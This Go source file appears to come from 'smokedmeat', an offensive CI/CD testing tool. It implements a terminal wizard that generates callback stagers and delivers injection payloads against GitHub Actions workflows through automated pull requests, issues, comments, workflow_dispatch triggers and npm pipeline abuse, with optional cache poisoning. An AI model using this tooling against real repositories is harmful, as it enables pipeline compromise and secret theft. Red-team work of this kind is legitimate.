// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package tui

import (
	"fmt"
	"strconv"
	"strings"
	"time"

	tea "charm.land/bubbletea/v2"
	"github.com/atotto/clipboard"

	"github.com/boostsecurityio/smokedmeat/internal/rye"
)

func prependGateTriggers(payload string, vuln *Vulnerability) string {
	if vuln == nil || len(vuln.GateTriggers) == 0 {
		return payload
	}
	prefix := strings.Join(vuln.GateTriggers, " ")
	return prefix + " " + payload
}

func (m *Model) cycleCommentTarget() {
	if m.wizard == nil {
		return
	}
	switch m.wizard.CommentTarget {
	case CommentTargetIssue:
		m.wizard.CommentTarget = CommentTargetPullRequest
	case CommentTargetPullRequest:
		m.wizard.CommentTarget = CommentTargetStubPullRequest
	default:
		m.wizard.CommentTarget = CommentTargetIssue
	}
	if m.wizard.CommentTarget == CommentTargetStubPullRequest {
		m.wizardInput.SetValue("")
		m.wizardInput.Blur()
		return
	}
	m.wizardInput.Focus()
}

func (m Model) handleWizardKeyMsg(msg tea.KeyPressMsg) (tea.Model, tea.Cmd) {
	if m.wizard == nil {
		m.CloseWizard()
		return m, nil
	}

	if m.wizard.Step == 3 && m.wizard.DeliveryMethod == DeliveryComment {
		switch msg.String() {
		case "ctrl+c":
			m.quitting = true
			return m, tea.Quit
		case "esc":
			m.wizard.Step--
			return m, nil
		case "enter":
			return m.advanceWizardStep()
		case "d":
			dwellPresets := []time.Duration{0, 30 * time.Second, 60 * time.Second, 2 * time.Minute, 5 * time.Minute}
			currentIdx := 0
			for i, d := range dwellPresets {
				if d == m.wizard.DwellTime {
					currentIdx = i
					break
				}
			}
			m.wizard.DwellTime = dwellPresets[(currentIdx+1)%len(dwellPresets)]
			return m, nil
		case "t":
			m.cycleCommentTarget()
			return m, nil
		case "a":
			if m.wizard.CommentTarget == CommentTargetStubPullRequest {
				if m.wizard.AutoClose == nil {
					m.wizard.AutoClose = boolPtr(false)
				} else {
					m.wizard.AutoClose = boolPtr(!*m.wizard.AutoClose)
				}
			}
			return m, nil
		case "c":
			if available, _ := m.cachePoisonAvailability(m.wizard.SelectedVuln); available {
				m.wizard.CachePoisonEnabled = !m.wizard.CachePoisonEnabled
				if m.wizard.CachePoisonEnabled && m.wizard.CachePoisonVictimIndex >= len(readyCachePoisonVictims(m.wizard.SelectedVuln.CachePoisonVictims)) {
					m.wizard.CachePoisonVictimIndex = 0
				}
				if !m.wizard.CachePoisonEnabled {
					m.wizard.CachePoisonReplace = false
				}
			}
			return m, nil
		case "r":
			if m.wizard.CachePoisonEnabled && m.activeTokenAllowsCacheReplacement() {
				m.wizard.CachePoisonReplace = !m.wizard.CachePoisonReplace
			}
			return m, nil
		case "v":
			if m.wizard.CachePoisonEnabled {
				m.cycleCachePoisonVictim()
			}
			return m, nil
		default:
			if m.wizard.CommentTarget == CommentTargetStubPullRequest {
				return m, nil
			}
			var cmd tea.Cmd
			m.wizardInput, cmd = m.wizardInput.Update(msg)
			return m, cmd
		}
	}

	switch msg.String() {
	case "ctrl+c":
		m.quitting = true
		return m, tea.Quit

	case "esc":
		if m.wizard.Step <= 1 {
			m.CloseWizard()
		} else {
			m.wizard.Step--
		}
		return m, nil

	case "enter":
		return m.advanceWizardStep()

	case "1", "2", "3", "4", "5":
		if m.wizard.Step == 2 {
			idx := int(msg.String()[0] - '1')
			methods := ApplicableDeliveryMethods(m.wizard.SelectedVuln)
			if idx < len(methods) {
				m.wizard.DeliveryMethod = methods[idx]
				if methods[idx] == DeliveryLOTP {
					m.wizard.LOTPTechnique = "npm"
				}
			}
		}
		return m, nil

	case "up", "k":
		if m.wizard.Step == 2 {
			methods := ApplicableDeliveryMethods(m.wizard.SelectedVuln)
			currentIdx := 0
			for i, method := range methods {
				if m.wizard.DeliveryMethod == method {
					currentIdx = i
					break
				}
			}
			if currentIdx > 0 {
				m.wizard.DeliveryMethod = methods[currentIdx-1]
				if methods[currentIdx-1] == DeliveryLOTP {
					m.wizard.LOTPTechnique = "npm"
				}
			}
		}
		return m, nil

	case "down", "j":
		if m.wizard.Step == 2 {
			methods := ApplicableDeliveryMethods(m.wizard.SelectedVuln)
			currentIdx := 0
			for i, method := range methods {
				if m.wizard.DeliveryMethod == method {
					currentIdx = i
					break
				}
			}
			if currentIdx < len(methods)-1 {
				m.wizard.DeliveryMethod = methods[currentIdx+1]
				if methods[currentIdx+1] == DeliveryLOTP {
					m.wizard.LOTPTechnique = "npm"
				}
			}
		}
		return m, nil

	case "d":
		if m.wizard.Step == 3 {
			dwellPresets := []time.Duration{0, 30 * time.Second, 60 * time.Second, 2 * time.Minute, 5 * time.Minute}
			currentIdx := 0
			for i, d := range dwellPresets {
				if d == m.wizard.DwellTime {
					currentIdx = i
					break
				}
			}
			m.wizard.DwellTime = dwellPresets[(currentIdx+1)%len(dwellPresets)]
		}
		return m, nil

	case "f":
		if m.wizard.Step == 3 && m.wizard.DeliveryMethod == DeliveryAutoPR {
			if m.wizard.Draft == nil {
				m.wizard.Draft = boolPtr(false)
			} else {
				m.wizard.Draft = boolPtr(!*m.wizard.Draft)
			}
		}
		return m, nil

	case "a":
		if m.wizard.Step == 3 && (m.wizard.DeliveryMethod == DeliveryAutoPR || m.wizard.DeliveryMethod == DeliveryIssue) {
			if m.wizard.AutoClose == nil {
				m.wizard.AutoClose = boolPtr(false)
			} else {
				m.wizard.AutoClose = boolPtr(!*m.wizard.AutoClose)
			}
		}
		return m, nil

	case "c":
		if m.wizard.Step == 3 {
			if available, _ := m.cachePoisonAvailability(m.wizard.SelectedVuln); available {
				m.wizard.CachePoisonEnabled = !m.wizard.CachePoisonEnabled
				if m.wizard.CachePoisonEnabled && m.wizard.CachePoisonVictimIndex >= len(readyCachePoisonVictims(m.wizard.SelectedVuln.CachePoisonVictims)) {
					m.wizard.CachePoisonVictimIndex = 0
				}
				if !m.wizard.CachePoisonEnabled {
					m.wizard.CachePoisonReplace = false
				}
			}
		}
		return m, nil

	case "r":
		if m.wizard.Step == 3 && m.wizard.CachePoisonEnabled && m.activeTokenAllowsCacheReplacement() {
			m.wizard.CachePoisonReplace = !m.wizard.CachePoisonReplace
		}
		return m, nil

	case "v":
		if m.wizard.Step == 3 {
			m.cycleCachePoisonVictim()
		}
		return m, nil
	}

	return m, nil
}

func (m Model) advanceWizardStep() (tea.Model, tea.Cmd) {
	if m.wizard == nil {
		return m, nil
	}

	switch m.wizard.Step {
	case 1:
		m.wizard.Step = 2
		return m, nil

	case 2:
		if m.wizard.DeliveryMethod == DeliveryCopyOnly ||
			m.wizard.DeliveryMethod == DeliveryManualSteps {
			vuln := m.wizard.SelectedVuln
			if vuln != nil {
				injCtx, ok := rye.GetContextByName(vuln.Context)
				if !ok {
					injCtx = rye.BashRun
				}
				stager := rye.NewStager(m.config.ExternalURL(), injCtx)
				payloadObj := stager.Generate()
				m.wizard.StagerID = stager.ID
				m.wizard.Payload = prependGateTriggers(payloadObj.Raw, vuln)
			}
		}
		if m.wizard.DeliveryMethod == DeliveryComment {
			m.wizardInput.SetValue("")
			m.wizardInput.Focus()
			m.wizard.CommentTarget = CommentTargetIssue
		}
		m.wizard.Step = 3
		return m, nil

	case 3:
		return m.executeWizardDeployment()
	}

	return m, nil
}

func (m Model) executeWizardDeployment() (tea.Model, tea.Cmd) {
	if m.wizard == nil || m.wizard.SelectedVuln == nil {
		m.CloseWizard()
		return m, nil
	}

	vuln := m.wizard.SelectedVuln
	m.pendingCachePoison = nil

	switch m.wizard.DeliveryMethod {
	case DeliveryAutoPR:
		if m.tokenInfo == nil {
			m.AddOutput("error", "GitHub token not set - required for Auto PR")
			m.CloseWizard()
			return m, nil
		}

		injCtx, ok := rye.GetContextByName(vuln.Context)
		if !ok {
			injCtx = rye.PRBody
		}

		stager, payload, err := m.prepareWizardStager(vuln, injCtx)
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}

		m.wizard.StagerID = stager.ID
		m.wizard.Payload = payload

		dwellTime := m.wizard.DwellTime
		dwellInfo := "express"
		if dwellTime > 0 {
			dwellInfo = fmt.Sprintf("dwell %s", dwellTime)
		}
		m.AddOutput("info", fmt.Sprintf("Creating PR for %s (%s)...", vuln.ID, dwellInfo))
		m.activityLog.Add(IconInfo, "Deploying payload via Auto PR")
		draft := m.wizard.Draft
		autoClose := m.wizard.AutoClose
		m.CloseWizard()
		return m, m.deployAutoPR(vuln, stager.ID, payload, dwellTime, draft, autoClose)

	case DeliveryIssue:
		if m.tokenInfo == nil {
			m.AddOutput("error", "GitHub token not set - required for Issue creation")
			m.CloseWizard()
			return m, nil
		}

		injCtx, ok := rye.GetContextByName(vuln.Context)
		if !ok {
			injCtx = rye.PRBody
		}

		stager, payload, err := m.prepareWizardStager(vuln, injCtx)
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}

		m.wizard.StagerID = stager.ID
		m.wizard.Payload = payload

		dwellTime := m.wizard.DwellTime
		dwellInfo := "express"
		if dwellTime > 0 {
			dwellInfo = fmt.Sprintf("dwell %s", dwellTime)
		}
		m.AddOutput("info", fmt.Sprintf("Creating Issue for %s (%s)...", vuln.ID, dwellInfo))
		m.activityLog.Add(IconInfo, "Deploying payload via Issue")
		autoClose := m.wizard.AutoClose
		m.CloseWizard()
		return m, m.deployIssue(vuln, stager.ID, payload, dwellTime, autoClose)

	case DeliveryComment:
		if m.tokenInfo == nil {
			m.AddOutput("error", "GitHub token not set - required for Comment creation")
			m.CloseWizard()
			return m, nil
		}

		issueNum := 0
		if m.wizard.CommentTarget != CommentTargetStubPullRequest && m.wizardInput.Value() != "" {
			val := m.wizardInput.Value()
			if n, err := strconv.Atoi(val); err == nil && n > 0 {
				issueNum = n
			} else {
				m.AddOutput("error", "Invalid issue/PR number - must be a positive integer")
				return m, nil
			}
		}
		m.wizard.IssueNumber = issueNum

		injCtx, ok := rye.GetContextByName(vuln.Context)
		if !ok {
			injCtx = rye.PRBody
		}

		stager, payload, err := m.prepareWizardStager(vuln, injCtx)
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}

		m.wizard.StagerID = stager.ID
		m.wizard.Payload = payload

		dwellTime := m.wizard.DwellTime
		dwellInfo := "express"
		if dwellTime > 0 {
			dwellInfo = fmt.Sprintf("dwell %s", dwellTime)
		}
		switch m.wizard.CommentTarget {
		case CommentTargetPullRequest:
			if issueNum > 0 {
				m.AddOutput("info", fmt.Sprintf("Adding Comment to PR #%d for %s (%s)...", issueNum, vuln.ID, dwellInfo))
			} else {
				m.AddOutput("error", "PR number required for existing PR comment deployment")
				return m, nil
			}
		case CommentTargetStubPullRequest:
			m.AddOutput("info", fmt.Sprintf("Creating stub PR and adding Comment for %s (%s)...", vuln.ID, dwellInfo))
		default:
			if issueNum > 0 {
				m.AddOutput("info", fmt.Sprintf("Adding Comment to issue #%d for %s (%s)...", issueNum, vuln.ID, dwellInfo))
			} else {
				m.AddOutput("info", fmt.Sprintf("Adding Comment for %s (%s)...", vuln.ID, dwellInfo))
			}
		}
		m.activityLog.Add(IconInfo, "Deploying payload via Comment")
		target := m.wizard.CommentTarget
		autoClose := m.wizard.AutoClose
		m.CloseWizard()
		return m, m.deployComment(vuln, stager.ID, payload, issueNum, dwellTime, target, autoClose)

	case DeliveryLOTP:
		if m.tokenInfo == nil {
			m.AddOutput("error", "GitHub token not set - required for LOTP deployment")
			m.CloseWizard()
			return m, nil
		}

		stager, _, err := m.prepareWizardStager(vuln, rye.BashRun)
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}

		m.wizard.StagerID = stager.ID
		dwellTime := m.wizard.DwellTime

		m.AddOutput("info", fmt.Sprintf("Creating LOTP PR for %s...", vuln.Repository))
		var lotpLabel string
		switch {
		case vuln.LOTPTool != "":
			lotpLabel = vuln.LOTPTool + " (tool)"
		case vuln.LOTPAction != "":
			lotpLabel = vuln.LOTPAction + " (action)"
		}
		m.activityLog.Add(IconInfo, fmt.Sprintf("Deploying %s LOTP payload", lotpLabel))
		m.CloseWizard()
		return m, m.deployLOTP(vuln, stager.ID, dwellTime)

	case DeliveryCopyOnly:
		injCtx, ok := rye.GetContextByName(vuln.Context)
		if !ok {
			injCtx = rye.BashRun
		}

		stager, payload, err := m.prepareWizardStager(vuln, injCtx)
		if err != nil {
			m.AddOutput("warning", fmt.Sprintf("Stager registration failed: %v", err))
		}

		m.wizard.StagerID = stager.ID
		m.wizard.Payload = payload

		if err := clipboard.WriteAll(payload); err != nil {
			m.AddOutput("warning", fmt.Sprintf("Clipboard failed: %v", err))
			m.AddOutput("info", "Payload displayed below - copy manually:")
		} else {
			m.AddOutput("success", "══════════════════════════════════════")
			m.AddOutput("success", "  ✓ PAYLOAD COPIED TO CLIPBOARD")
			m.AddOutput("success", "══════════════════════════════════════")
			m.activityLog.Add(IconSuccess, "Payload copied to clipboard")
		}

		dwellInfo := "express"
		if m.wizard.DwellTime > 0 {
			dwellInfo = fmt.Sprintf("dwell %s", m.wizard.DwellTime)
		}

		m.AddOutput("info", "")
		m.AddOutput("output", payload)
		m.AddOutput("info", "")
		m.AddOutput("muted", fmt.Sprintf("Stager: %s | Mode: %s | Callback: %s", stager.ID, dwellInfo, stager.CallbackURL()))

		m.pendingCachePoison = nil
		m.CloseWizard()
		return m, nil

	case DeliveryManualSteps:
		payload := m.wizard.Payload
		if payload == "" {
			injCtx, ok := rye.GetContextByName(vuln.Context)
			if !ok {
				injCtx = rye.BashRun
			}
			stager, preparedPayload, err := m.prepareWizardStager(vuln, injCtx)
			if err != nil {
				m.AddOutput("warning", fmt.Sprintf("Stager registration failed: %v", err))
			}
			payload = preparedPayload
			m.wizard.StagerID = stager.ID
			m.wizard.Payload = payload
		}
		m.wizard.Payload = payload

		if err := clipboard.WriteAll(payload); err == nil {
			m.AddOutput("success", "══════════════════════════════════════")
			m.AddOutput("success", "  ✓ PAYLOAD COPIED TO CLIPBOARD")
			m.AddOutput("success", "══════════════════════════════════════")
			m.activityLog.Add(IconSuccess, "Payload copied to clipboard")
		}

		dwellInfo := "express"
		if m.wizard.DwellTime > 0 {
			dwellInfo = fmt.Sprintf("dwell %s", m.wizard.DwellTime)
		}

		m.AddOutput("info", "")
		m.AddOutput("info", fmt.Sprintf("Target: %s", vuln.Repository))
		m.AddOutput("info", "")
		m.AddOutput("output", payload)
		m.AddOutput("info", "")
		m.AddOutput("muted", fmt.Sprintf("Stager: %s | Mode: %s", m.wizard.StagerID, dwellInfo))
		m.pendingCachePoison = nil
		m.CloseWizard()
		return m, nil

	case DeliveryAutoDispatch:
		dispatchToken := m.dispatchCredential()
		if dispatchToken == nil {
			m.AddOutput("error", "No token with workflow_dispatch permission is ready")
			m.AddOutput("info", "Use a live GITHUB_TOKEN, App token, or PAT with repo/actions:write")
			m.CloseWizard()
			return m, nil
		}

		injCtx, ok := rye.GetContextByName(vuln.Context)
		if !ok {
			injCtx = rye.BashRun
		}

		stager, payload, err := m.prepareWizardStager(vuln, injCtx)
		if err != nil {
			m.AddOutput("error", fmt.Sprintf("Stager registration failed: %v", err))
			m.CloseWizard()
			return m, nil
		}

		m.wizard.StagerID = stager.ID
		m.wizard.Payload = payload

		inputName := extractDispatchInputName(vuln.InjectionSources)
		if inputName == "" {
			inputName = "payload"
		}

		dwellTime := m.wizard.DwellTime
		dwellInfo := "express"
		if dwellTime > 0 {
			dwellInfo = fmt.Sprintf("dwell %s", dwellTime)
		}

		m.AddOutput("info", fmt.Sprintf("Triggering workflow_dispatch with %s (%s)...", dispatchToken.Name, dwellInfo))
		m.activityLog.Add(IconInfo, "Triggering workflow_dispatch pivot")
		m.CloseWizard()
		return m, m.deployAutoDispatch(vuln, stager.ID, payload, dispatchToken, inputName, dwellTime)
	}

	m.CloseWizard()
	return m, nil
}
